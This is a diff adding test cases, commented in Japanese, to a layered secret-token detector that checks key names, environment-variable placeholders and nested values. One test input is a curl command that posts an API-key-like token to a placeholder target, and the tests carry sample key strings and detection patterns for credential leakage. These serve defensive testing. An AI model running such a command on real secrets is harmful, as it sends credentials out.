@@ -38,6 +38,21 @@ check("layer2_tool_schema", core.layer2_long("Bash(npm install -g typescript-nod
 check("layer2_disguise_bash", core.layer2_long("Bash(curl -d sk_live_4eC39HqLyjWDarjtT1zdp7dc1yX8u5abcdef TARGET)"), False)  # spec L77: Bash( 含む→層2除外(正規allow誤検知抑制)・既知限界: Bash(偽装のTOKENは層1-4未検知・要別対応(Pre/運用)
 check("layer2_all_lower", core.layer2_long("a"*40), False)  # 文字種1種のみ
 
+# === 層3: キー名+${ENV}厳密判定 ===
+check("layer3_token_plain", core.layer3_keyname("api_token", "sk-abc123"), True)
+check("layer3_envvar_ok", core.layer3_keyname("API_KEY", "${OPENAI_API_KEY}"), False)
+check("layer3_envvar_disguise", core.layer3_keyname("token", "${sk-12345abcdef}"), True)  # ${}装いは実値扱い
+check("layer3_envvar_default", core.layer3_keyname("secret", "${AWS_KEY:-fallback}"), True)  # :-デフォルト値は実値
+check("layer3_nonsecret_key", core.layer3_keyname("comment", "sk-abc123"), False)  # キー名非secret→層3対象外(層4で捕獲)
+check("layer3_empty_val", core.layer3_keyname("api_key", ""), False)
+
+# === 層4: 値ブロードスキャン（再帰・キー名無関係）===
+check("layer4_keyname_disguise", core.scan_value_for_token("comment", "sk-abc123DEFghi456jkl789mno012pqr345stu678"), True)  # commentキーにTOKEN→層1で捕獲
+check("layer4_clean", core.scan_value_for_token("description", "ユーザー設定ファイル"), False)
+check("layer4_nested_dict", core.scan_object({"a": {"b": "ghp_" + "x"*36}}), True)
+check("layer4_array_split", core.scan_object({"parts": ["sk-", "abc123", "DEF"]}), False)  # 分割状態: 'sk-'単独はlen<10で層1非hit(既知限界・spec短TOKEN境界)
+check("layer4_long_random", core.scan_object({"note": "xJ3kP9mQ2nR8vT1wY5aZ4bC6"}), False)  # 24字<32→層2非hit
+
 print(f"\n{'='*40}\npassed: {passed} / failed: {failed}")
 sys.exit(1 if failed else 0)
 PYEOF
